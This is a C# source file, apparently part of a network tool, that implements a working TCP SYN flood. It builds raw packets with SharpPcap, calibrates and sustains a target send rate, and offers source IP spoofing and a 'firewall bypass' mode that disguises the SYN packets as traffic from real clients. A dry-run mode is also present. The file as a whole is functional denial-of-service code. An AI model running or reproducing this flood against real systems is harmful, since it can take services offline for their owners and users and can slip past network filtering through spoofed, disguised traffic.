using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using Dorothy.Services;
using System.Linq;

namespace Dorothy.Models
{

    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private readonly FloodOptions _options;
        private LibPcapLiveDevice? _device;

        public event EventHandler<PacketEventArgs>? PacketSent;
        public event EventHandler<Dorothy.Services.FloodSnapshot>? StatsPublished;
        public event EventHandler? CalibrationStarted;
        public event EventHandler? CalibrationCompleted;

        public bool IsRouted { get; set; } = false;
        public bool AddPayload { get; set; } = false;
        public bool RandomizeFlows { get; set; } = false;
        public bool SpoofSourceIp { get; set; } = false;
        public bool AddTcpOptions { get; set; } = true;
        public bool DryRunMode { get; set; } = false;

        private static readonly byte[] SynOptions =
        {
            0x02, 0x04, 0x05, 0xb4,
            0x01,
            0x03, 0x03, 0x08,
            0x01,
            0x04, 0x02,
            0x00
        };

        private static readonly ushort[] RealisticWindowSizes = { 65535, 64240, 65495, 29200, 8192, 16384 };

        public TcpFlood(
            PacketParameters parameters,
            CancellationToken cancellationToken,
            FloodOptions? options = null)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
            _options = options ?? new FloodOptions();
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        protected virtual void OnStatsPublished(Dorothy.Services.FloodSnapshot snapshot)
            => StatsPublished?.Invoke(this, snapshot);

        protected virtual void OnCalibrationStarted()   => CalibrationStarted?.Invoke(this, EventArgs.Empty);
        protected virtual void OnCalibrationCompleted() => CalibrationCompleted?.Invoke(this, EventArgs.Empty);

        private static ushort ComputeChecksum(byte[] data, int offset, int length)
        {
            long sum = 0;
            int end = offset + length;
            int i = offset;
            while (i < end - 1) { sum += (data[i] << 8) | data[i + 1]; i += 2; }
            if (i < end) sum += data[i] << 8;
            while (sum >> 16 != 0) sum = (sum & 0xFFFF) + (sum >> 16);
            return (ushort)~sum;
        }

        private static void UpdateIpChecksum(byte[] frame, int ipOffset)
        {
            frame[ipOffset + 10] = 0;
            frame[ipOffset + 11] = 0;
            ushort cs = ComputeChecksum(frame, ipOffset, 20);
            frame[ipOffset + 10] = (byte)(cs >> 8);
            frame[ipOffset + 11] = (byte)cs;
        }

        private static void UpdateTcpChecksum(byte[] frame, int ipOffset, int tcpOffset, int tcpLength)
        {
            frame[tcpOffset + 16] = 0;
            frame[tcpOffset + 17] = 0;

            byte[] pseudo = new byte[12 + tcpLength];
            Buffer.BlockCopy(frame, ipOffset + 12, pseudo, 0, 4);
            Buffer.BlockCopy(frame, ipOffset + 16, pseudo, 4, 4);
            pseudo[8] = 0;
            pseudo[9] = 6;
            pseudo[10] = (byte)(tcpLength >> 8);
            pseudo[11] = (byte)tcpLength;
            Buffer.BlockCopy(frame, tcpOffset, pseudo, 12, tcpLength);

            ushort cs = ComputeChecksum(pseudo, 0, pseudo.Length);
            frame[tcpOffset + 16] = (byte)(cs >> 8);
            frame[tcpOffset + 17] = (byte)cs;
        }

        private static byte[] InsertSynOptions(byte[] frame) => InsertSynOptions(frame, SynOptions);

        private static byte[] InsertSynOptions(byte[] frame, byte[] options)
        {
            const int etherLen = 14;
            int ipStart = etherLen;
            int ipHeaderLen = (frame[ipStart] & 0x0F) * 4;
            int tcpStart = ipStart + ipHeaderLen;
            int tcpBaseEnd = tcpStart + 20;

            int optLen = options.Length;

            if ((optLen & 0x03) != 0)
                throw new ArgumentException("TCP options length must be 4-byte aligned.", nameof(options));

            byte[] newFrame = new byte[frame.Length + optLen];
            Buffer.BlockCopy(frame, 0, newFrame, 0, tcpBaseEnd);
            Buffer.BlockCopy(options, 0, newFrame, tcpBaseEnd, optLen);
            if (frame.Length > tcpBaseEnd)
                Buffer.BlockCopy(frame, tcpBaseEnd, newFrame, tcpBaseEnd + optLen, frame.Length - tcpBaseEnd);

            int dataOffsetWords = (20 + optLen) / 4;
            newFrame[tcpStart + 12] = (byte)((dataOffsetWords << 4) | (newFrame[tcpStart + 12] & 0x0F));

            int oldIpTotal = (newFrame[ipStart + 2] << 8) | newFrame[ipStart + 3];
            int newIpTotal = oldIpTotal + optLen;
            newFrame[ipStart + 2] = (byte)(newIpTotal >> 8);
            newFrame[ipStart + 3] = (byte)newIpTotal;

            UpdateIpChecksum(newFrame, ipStart);
            int tcpSegLen = newIpTotal - ipHeaderLen;
            UpdateTcpChecksum(newFrame, ipStart, tcpStart, tcpSegLen);

            return newFrame;
        }

        private static byte[] BuildBypassSynOptions(Random random, ushort[] mssChoices, ushort[] windowChoices)
        {
            ushort mss = mssChoices[random.Next(mssChoices.Length)];
            uint tsVal = (uint)random.Next();
            byte wscale = (byte)(random.Next(2) == 0 ? 7 : 8);

            return new byte[]
            {
                0x02, 0x04, (byte)(mss >> 8), (byte)mss,
                0x04, 0x02,
                0x08, 0x0A,
                (byte)(tsVal >> 24), (byte)(tsVal >> 16),
                (byte)(tsVal >> 8),  (byte)tsVal,
                0x00, 0x00, 0x00, 0x00,
                0x01,
                0x03, 0x03, wscale
            };
        }

        private static readonly ushort[] BypassMssChoices    = { 1360, 1400, 1460 };
        private static readonly ushort[] BypassWindowChoices = { 8192, 16384, 29200, 65535 };

        public async Task StartAsync()
        {
            Logger.Info(DryRunMode ? "Starting TCP SYN Flood (DRY-RUN — validate only, no transmit)."
                                   : "Starting TCP SYN Flood attack.");
            try
            {
                IInjectionDevice? injectionDevice = null;
                bool useInjection = false;

                if (!DryRunMode)
                {
                    _device = CaptureDeviceList.Instance
                        .OfType<LibPcapLiveDevice>()
                        .FirstOrDefault(d => d.Addresses.Any(addr =>
                            addr.Addr.ipAddress != null &&
                            addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                    if (_device == null)
                    {
                        Logger.Error("No device found with the specified source IP.");
                        throw new Exception("No device found with the specified source IP.");
                    }

                    _device.Open(DeviceModes.Promiscuous, 1000);

                    injectionDevice = _device as IInjectionDevice;
                    useInjection    = injectionDevice != null;

                    if (!useInjection && !IsRouted)
                        throw new Exception($"Device {_device.Name} does not support packet injection.");
                    if (!useInjection && IsRouted)
                        Logger.Info($"Device {_device.Name} does not support injection, " +
                                    "using standard SendPacket for routed attack");
                }

                var random = new Random();
                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                bool useRoutedBehavior = IsRouted || RandomizeFlows;
                bool usePayload = AddPayload && !useRoutedBehavior;

                bool effectiveSpoof     = SpoofSourceIp && !_options.UseRealSourceIp;
                bool bypassMode         = _options.FirewallBypassMode;
                bool forceSwChecksum    = _options.ForceSoftwareChecksum;
                bool subnetSpoof        = _options.RandomizeWithinSubnet && effectiveSpoof;

                Logger.Info($"TCP Flood mode: Routed={useRoutedBehavior}, Payload={usePayload}, " +
                            $"RandomizeFlows={RandomizeFlows}, SpoofSourceIp={effectiveSpoof}, " +
                            $"AddTcpOptions={AddTcpOptions}, Bypass={bypassMode}, " +
                            $"ForceSwCsum={forceSwChecksum}, SubnetSpoof={subnetSpoof}");

                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = _params.Ttl
                };

                var tcpPacket = new TcpPacket(
                    (ushort)(RandomizeFlows ? random.Next(49152, 65536) : _params.SourcePort),
                    (ushort)_params.DestinationPort)
                {
                    Flags = 0x02,
                    WindowSize = (ushort)(RandomizeFlows
                        ? RealisticWindowSizes[random.Next(RealisticWindowSizes.Length)]
                        : 65535),
                    SequenceNumber = (uint)random.Next()
                };

                if (usePayload)
                {
                    tcpPacket.PayloadData = new byte[1400];
                    random.NextBytes(tcpPacket.PayloadData);
                }

                if (RandomizeFlows)
                {
                    ipPacket.Id = (ushort)random.Next(0, 65536);
                    ipPacket.TimeToLive = (byte)(random.Next(2) == 0 ? 64 : 128);
                }

                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                double maxPps = 0;
                int payloadLength = 0;
                int wireHeaderSize = 0;
                int actualWireSize = 0;
                long targetBytesPerSecond = _params.BytesPerSecond;
                if (!DryRunMode)
                    targetBytesPerSecond = FloodScheduler.ClampTargetToNicSpeed(_params.SourceIp?.ToString(), targetBytesPerSecond);
                double userMbps = targetBytesPerSecond * 8.0 / 1_000_000;

                if (!DryRunMode && (IsRouted || useRoutedBehavior))
                {
                    Logger.Info("Starting calibration for routed TCP mode...");
                    OnCalibrationStarted();

                    var refTcp = new TcpPacket(
                        (ushort)random.Next(49152, 65536),
                        (ushort)_params.DestinationPort)
                    {
                        Flags = 0x02,
                        WindowSize = RealisticWindowSizes[random.Next(RealisticWindowSizes.Length)],
                        SequenceNumber = (uint)random.Next()
                    };
                    var refIp = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                    {
                        Protocol = PacketDotNet.ProtocolType.Tcp,
                        TimeToLive = 64,
                        Id = (ushort)random.Next(0, 65536)
                    };
                    var refEth = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                    refIp.PayloadPacket = refTcp;
                    refEth.PayloadPacket = refIp;
                    refTcp.UpdateCalculatedValues();
                    refIp.UpdateCalculatedValues();

                    byte[] refBase = refEth.Bytes;
                    byte[] refPacket = AddTcpOptions
                        ? (bypassMode
                            ? InsertSynOptions(refBase, BuildBypassSynOptions(random, BypassMssChoices, BypassWindowChoices))
                            : InsertSynOptions(refBase))
                        : refBase;
                    wireHeaderSize = refPacket.Length + 4;

                    int calWorkerCount = Math.Min(Environment.ProcessorCount, 4);
                    if (calWorkerCount < 1) calWorkerCount = 1;
                    const int calMs = 500;
                    long totalCalPkts = 0;

                    var calSw = Stopwatch.StartNew();
                    var calTasks = new Task[calWorkerCount];

                    for (int w = 0; w < calWorkerCount; w++)
                    {
                        calTasks[w] = Task.Run(() =>
                        {
                            long localPkts = 0;
                            var localSw = Stopwatch.StartNew();
                            while (localSw.ElapsedMilliseconds < calMs)
                            {
                                if (useInjection) injectionDevice!.SendPacket(refPacket);
                                else _device!.SendPacket(refPacket);
                                localPkts++;
                            }
                            Interlocked.Add(ref totalCalPkts, localPkts);
                        });
                    }

                    Task.WaitAll(calTasks);
                    calSw.Stop();

                    double calSec = calSw.ElapsedTicks / (double)Stopwatch.Frequency;
                    maxPps = totalCalPkts / calSec;
                    Logger.Info($"Calibration: {totalCalPkts} pkts in {calSec:F3}s = {maxPps:F0} pps ({calWorkerCount} workers)");

                    double effectiveMaxPps = maxPps;

                    long requiredWire = (long)(targetBytesPerSecond / effectiveMaxPps);
                    payloadLength = (int)(requiredWire - wireHeaderSize);
                    payloadLength = Math.Max(0, Math.Min(payloadLength, 1400));

                    actualWireSize = wireHeaderSize + payloadLength;
                    double effectiveMbps = effectiveMaxPps * actualWireSize * 8.0 / 1_000_000;

                    if (userMbps > effectiveMbps)
                    {
                        effectiveMbps = Math.Max(0.1, effectiveMbps);
                        targetBytesPerSecond = (long)(effectiveMbps * 1_000_000 / 8.0);
                        Logger.Warn($"Requested {userMbps:F2} Mbps exceeds capacity ({effectiveMbps:F2} Mbps). Clamping.");
                    }

                    Logger.Info($"Routed TCP: header={refPacket.Length}B, payload={payloadLength}B, " +
                                $"wire={actualWireSize}B, measuredPps={maxPps:F0}, " +
                                $"workers={calWorkerCount}, effective={effectiveMbps:F2} Mbps");
                    OnCalibrationCompleted();

                    if (payloadLength > 0)
                    {
                        tcpPacket.PayloadData = new byte[payloadLength];
                        random.NextBytes(tcpPacket.PayloadData);
                        tcpPacket.UpdateCalculatedValues();
                        ipPacket.UpdateCalculatedValues();
                        byte[] withPayload = ethernetPacket.Bytes;
                        byte[] withOpts = AddTcpOptions
                            ? (bypassMode
                                ? InsertSynOptions(withPayload, BuildBypassSynOptions(random, BypassMssChoices, BypassWindowChoices))
                                : InsertSynOptions(withPayload))
                            : withPayload;
                        actualWireSize = withOpts.Length + 4;
                    }
                }

                int finalPayloadLength = payloadLength;
                long finalTargetBps = targetBytesPerSecond;
                bool isRoutedMode = IsRouted || useRoutedBehavior;
                var srcIpBytes = _params.SourceIp.GetAddressBytes();

                const int poolSize = 1024;

                int actualPacketSize = 0;
                var packetPool = new byte[poolSize][];

                void BuildPoolEntry(int idx)
                {
                    if (RandomizeFlows || bypassMode)
                    {
                        tcpPacket.SourcePort = (ushort)random.Next(49152, 65536);
                        tcpPacket.SequenceNumber = (uint)random.Next();
                        tcpPacket.WindowSize = bypassMode
                            ? BypassWindowChoices[random.Next(BypassWindowChoices.Length)]
                            : RealisticWindowSizes[random.Next(RealisticWindowSizes.Length)];
                        ipPacket.Id = (ushort)random.Next(0, 65536);
                        ipPacket.TimeToLive = (byte)(random.Next(2) == 0 ? 64 : 128);

                        if (effectiveSpoof)
                        {
                            var spoof = (byte[])srcIpBytes.Clone();
                            if (subnetSpoof)
                            {

                                spoof[3] = (byte)random.Next(1, 255);
                            }
                            else
                            {
                                spoof[2] = (byte)random.Next(0, 256);
                                spoof[3] = (byte)random.Next(1, 255);
                            }
                            ipPacket.SourceAddress = new IPAddress(spoof);
                        }
                    }
                    else
                    {
                        tcpPacket.SequenceNumber = (uint)random.Next();
                    }

                    if (isRoutedMode && finalPayloadLength > 0 && tcpPacket.PayloadData != null)
                        random.NextBytes(tcpPacket.PayloadData);

                    tcpPacket.UpdateCalculatedValues();
                    ipPacket.UpdateCalculatedValues();

                    byte[] baseFrame = ethernetPacket.Bytes;
                    byte[] finalFrame;
                    if (AddTcpOptions)
                    {
                        finalFrame = bypassMode
                            ? InsertSynOptions(baseFrame, BuildBypassSynOptions(random, BypassMssChoices, BypassWindowChoices))
                            : InsertSynOptions(baseFrame);
                    }
                    else finalFrame = baseFrame;

                    if (forceSwChecksum)
                    {
                        const int ipStart = 14;
                        int ipHdrLen = (finalFrame[ipStart] & 0x0F) * 4;
                        int tcpStart = ipStart + ipHdrLen;
                        int ipTotal  = (finalFrame[ipStart + 2] << 8) | finalFrame[ipStart + 3];
                        UpdateIpChecksum(finalFrame, ipStart);
                        UpdateTcpChecksum(finalFrame, ipStart, tcpStart, ipTotal - ipHdrLen);
                    }

                    packetPool[idx] = finalFrame;
                }

                for (int i = 0; i < poolSize; i++)
                {
                    BuildPoolEntry(i);
                    if (i == 0) actualPacketSize = packetPool[0].Length;
                }

                int wirePacketSize = isRoutedMode
                    ? (actualWireSize > 0 ? actualWireSize : actualPacketSize + 4)
                    : (actualPacketSize + 4);

                double finalMbps = finalTargetBps * 8.0 / 1_000_000;
                Logger.Info($"TCP packet wire size: {wirePacketSize} bytes, target: {finalMbps:F2} Mbps");

                if (DryRunMode)
                {
                    var (valid, invalid) = PacketValidator.ValidatePoolFull(packetPool, "TCP");
                    Logger.Info($"TCP DRY-RUN complete — {valid}/{poolSize} valid, " +
                                $"{invalid} invalid. No packets transmitted.");
                    return;
                }

                await RunParallelSendLoopAsync(
                    packetPool, wirePacketSize, finalTargetBps, finalMbps,
                    injectionDevice, useInjection);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        private const int SendQueueCapacityBytes = 16 * 1024 * 1024;
        private const int FlushThresholdBytes = 1_000_000;
        private const int FlushThresholdPackets = 1000;

        private async Task RunParallelSendLoopAsync(
            byte[][] pool,
            int wireSize,
            long targetBps,
            double tgtMbps,
            IInjectionDevice? injectionDevice,
            bool useInjection)
        {
            int drainMax = tgtMbps > 500 ? 2000 : tgtMbps > 100 ? 1000 : tgtMbps > 50 ? 500 : tgtMbps > 10 ? 200 : 100;

            long sharedBytes   = 0;
            long sharedPackets = 0;
            long sharedFailed  = 0;
            long sharedSpin    = 0;
            long sharedSleep   = 0;

            var scheduler = new FloodScheduler(targetBps);
            var schedulers = new[] { scheduler };

            Logger.Info($"[TCP] Single-threaded SendQueue loop: target={tgtMbps:F2} Mbps, " +
                        $"queue_capacity={SendQueueCapacityBytes} bytes, drain_max={drainMax}, " +
                        $"useInjection={useInjection}");

            var sendTask = Task.Run(() =>
            {
                int idx = 0;
                long localSent = 0;
                var workerSw = Stopwatch.StartNew();
                Logger.Info($"Flood worker started: id=0 of 1 targetBps={targetBps} pool_size={pool.Length}");

                var sender = new DoubleBufferedSender(
                    _device!, SendQueueCapacityBytes, FlushThresholdBytes, FlushThresholdPackets, "TCP");

                long winPkts = 0, winBytes = 0, winEnqueueUs = 0, winWaitUs = 0, winWaitCount = 0;
                var winSw = Stopwatch.StartNew();

                void EmitWorkerWindowIfDue()
                {
                    if (winSw.ElapsedMilliseconds < 1000) return;
                    double avgEnq  = winPkts > 0 ? (double)winEnqueueUs / winPkts : 0.0;
                    double avgWait = winWaitCount > 0 ? (double)winWaitUs / winWaitCount : 0.0;
                    double lastSendUs = sender.LastFlushTransmittedBytes > 0 && sender.LastFlushMicros > 0 && wireSize > 0
                        ? sender.LastFlushMicros / (double)Math.Max(1, sender.LastFlushTransmittedBytes / wireSize)
                        : 0.0;
                    Logger.Info($"[TCP-W0] pkts={winPkts} bytes={winBytes} " +
                                $"send_us_avg={lastSendUs:F1} enqueue_us_avg={avgEnq:F1} " +
                                $"bucket_wait_us_avg={avgWait:F1} waits={winWaitCount}");
                    winPkts = 0; winBytes = 0; winEnqueueUs = 0; winWaitUs = 0; winWaitCount = 0;
                    winSw.Restart();
                }

                try
                {
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        EmitWorkerWindowIfDue();
                        int count = scheduler.Drain(wireSize, drainMax);

                        if (count == 0)
                        {
                            long waitStart = Stopwatch.GetTimestamp();
                            if (tgtMbps < 5.0)
                            {
                                Thread.Sleep(1);
                                scheduler.RecordSleep();
                                Interlocked.Increment(ref sharedSleep);
                            }
                            else
                            {
                                Thread.SpinWait(200);
                                scheduler.RecordSpin();
                                Interlocked.Increment(ref sharedSpin);
                            }
                            long waitTicks = Stopwatch.GetTimestamp() - waitStart;
                            winWaitUs += waitTicks * 1_000_000L / Stopwatch.Frequency;
                            winWaitCount++;
                            scheduler.LogTelemetry(0, 1, targetBps,
                                tgtMbps < 5.0 ? "Sleep" : "SpinWait", 0);
                            continue;
                        }

                        long enqStart = Stopwatch.GetTimestamp();
                        for (int i = 0; i < count; i++)
                        {
                            sender.AddPacket(pool[idx].ToArray());
                            idx++;
                            if (idx >= pool.Length) idx = 0;
                        }
                        long enqTicks = Stopwatch.GetTimestamp() - enqStart;
                        winEnqueueUs += enqTicks * 1_000_000L / Stopwatch.Frequency;

                        for (int i = 0; i < count; i++) scheduler.RecordSent(wireSize);
                        Interlocked.Add(ref sharedBytes, (long)wireSize * count);
                        long running = Interlocked.Add(ref sharedPackets, count);
                        localSent += count;
                        winPkts += count;
                        winBytes += (long)wireSize * count;

                        if (count > 0 && ((running >> 10) != ((running - count) >> 10)))
                            OnPacketSent(pool[idx], _params.SourceIp, _params.DestinationIp, _params.DestinationPort);
                    }
                }
                finally
                {
                    try { sender.Dispose(); }
                    catch (Exception ex) { Logger.Debug(ex, "[TCP] sender dispose failed"); }
                }

                workerSw.Stop();
                Logger.Info($"Flood worker finished: id=0 sent={localSent} elapsed={workerSw.ElapsedMilliseconds}ms");
            }, _cancellationToken);

            await PublishStatsLoopAsync(
                "TCP", targetBps, tgtMbps, schedulers,
                () => Interlocked.Read(ref sharedBytes),
                () => Interlocked.Read(ref sharedPackets),
                () => Interlocked.Read(ref sharedFailed),
                () => Interlocked.Read(ref sharedSpin),
                () => Interlocked.Read(ref sharedSleep));

            try { await sendTask; } catch (OperationCanceledException) { }

            Logger.Info($"[TCP] Stopped. bytes={Interlocked.Read(ref sharedBytes):N0} " +
                        $"packets={Interlocked.Read(ref sharedPackets):N0} " +
                        $"failed={Interlocked.Read(ref sharedFailed):N0}");
        }

        private async Task PublishStatsLoopAsync(
            string protocol,
            long targetBps,
            double tgtMbps,
            FloodScheduler[] schedulers,
            Func<long> getBytes,
            Func<long> getPackets,
            Func<long> getFailed,
            Func<long> getSpin,
            Func<long> getSleep)
        {
            const double α1s  = 0.393;
            const double α5s  = 0.095;
            const double α10s = 0.049;
            double ema1s = 0, ema5s = 0, ema10s = 0;

            long freq = Stopwatch.Frequency;
            long windowStartTick  = Stopwatch.GetTimestamp();
            long windowStartBytes = 0;
            long runStartTick     = windowStartTick;

            try
            {
                while (!_cancellationToken.IsCancellationRequested)
                {
                    await Task.Delay(500, _cancellationToken);

                    long nowTick   = Stopwatch.GetTimestamp();
                    long bytesNow  = getBytes();
                    long pktNow    = getPackets();
                    long failNow   = getFailed();
                    long spinNow   = getSpin();
                    long sleepNow  = getSleep();

                    double windowSec = (nowTick - windowStartTick) / (double)freq;
                    if (windowSec <= 0) windowSec = 0.5;

                    long   wBytes = bytesNow - windowStartBytes;
                    double wMbps  = wBytes * 8.0 / (windowSec * 1_000_000.0);

                    ema1s  = ema1s  == 0 ? wMbps : α1s  * wMbps + (1 - α1s)  * ema1s;
                    ema5s  = ema5s  == 0 ? wMbps : α5s  * wMbps + (1 - α5s)  * ema5s;
                    ema10s = ema10s == 0 ? wMbps : α10s * wMbps + (1 - α10s) * ema10s;

                    double elapsed = (nowTick - runStartTick) / (double)freq;
                    double actualMbps = elapsed > 0
                        ? bytesNow * 8.0 / (elapsed * 1_000_000.0)
                        : 0.0;
                    double vsPct = tgtMbps > 0 ? (actualMbps / tgtMbps) * 100.0 : 0.0;

                    string reason = FloodScheduler.InferReasonString(
                        targetBps, ema1s, pktNow, failNow, spinNow, sleepNow, elapsed);

                    var snap = new FloodSnapshot
                    {
                        TargetWireBytesPerSec       = targetBps,
                        ActualWireBytesPerSecShort  = (long)(ema1s * 125_000),
                        ActualWireBytesPerSecMedium = (long)(ema5s * 125_000),
                        PacketsAttempted            = pktNow,
                        PacketsSent                 = pktNow,
                        PacketsFailed               = failNow,
                        PacketsDropped              = 0,
                        WireBytesSent               = bytesNow,
                        SchedulerSleepCycles        = sleepNow,
                        SchedulerSpinCycles         = spinNow,
                        ElapsedSeconds              = elapsed,
                        Protocol                    = protocol,
                        LastReason                  = DiagnosticReason.None,
                        Confidence                  = DiagnosticConfidence.Medium,
                        IsCalibrating               = false,
                        ReasonString                = reason,
                        ActualMbps                  = actualMbps,
                        VsTargetPercent             = vsPct
                    };

                    foreach (var sch in schedulers)
                    {
                        sch.Mbps1s  = ema1s;
                        sch.Mbps5s  = ema5s;
                        sch.Mbps10s = ema10s;
                    }

                    OnStatsPublished(snap);
                    Logger.Info($"[{protocol}] target={tgtMbps:F2}  window={wMbps:F2}  " +
                                $"ema1s={ema1s:F2}  actual={actualMbps:F2}  " +
                                $"pkts={pktNow:N0}  fail={failNow}  reason={reason}");

                    windowStartTick  = nowTick;
                    windowStartBytes = bytesNow;
                }
            }
            catch (OperationCanceledException) {  }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}
